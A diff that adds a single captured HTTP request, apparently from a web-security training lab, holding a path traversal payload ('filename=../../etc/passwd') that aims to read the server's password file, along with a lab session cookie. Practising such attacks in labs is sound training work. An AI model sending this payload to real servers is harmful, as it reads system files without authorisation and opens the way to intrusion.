@@ -1,0 +1,12 @@
+GET /image?filename=../../etc/passwd. HTTP/1.1
+Host: ac6c1f501faee9f2802e168b00f70083.web-security-academy.net
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/,/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://ac6c1f501faee9f2802e168b00f70083.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=hCELy4nDj8Y6TUjEITKNUETcB0hy11xh
